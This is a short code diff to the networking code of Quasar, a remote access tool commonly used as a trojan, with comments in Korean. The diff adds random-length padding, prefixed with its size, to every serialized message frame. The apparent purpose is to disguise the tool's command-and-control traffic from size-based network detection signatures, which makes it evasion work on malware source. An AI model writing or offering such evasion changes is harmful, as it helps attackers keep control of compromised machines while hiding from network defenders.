@@ -37,9 +37,24 @@ namespace Quasar.Common.Networking
             {
                 Serializer.Serialize(ms, message);
                 byte[] payload = ms.ToArray();
-                WriteInteger(payload.Length);
-                WriteBytes(payload);
-                return sizeof(int) + payload.Length;
+
+                Random rnd = new Random();
+                int paddingSize = rnd.Next(1, 129); // 1~128바이트 가변 패딩
+                byte[] padding = new byte[paddingSize];
+                rnd.NextBytes(padding);
+
+                // [중요] 전체 본문 길이 = 패딩크기정보(1B) + 패딩데이터 + 실제데이터
+                int totalBodyLength = 1 + paddingSize + payload.Length;
+
+                // 1. 하부 엔진용 4바이트 헤더 기록 (전체 데이터 덩어리 크기)
+                WriteInteger(totalBodyLength);
+
+                // 2. 내부 구조 기록 (순서가 매우 중요함)
+                _innerStream.WriteByte((byte)paddingSize); // 첫 바이트에 패딩 크기 기록
+                _innerStream.Write(padding, 0, padding.Length); // 실제 패딩 데이터
+                _innerStream.Write(payload, 0, payload.Length); // 진짜 메시지 본문
+
+                return 4 + totalBodyLength;
             }
         }
 
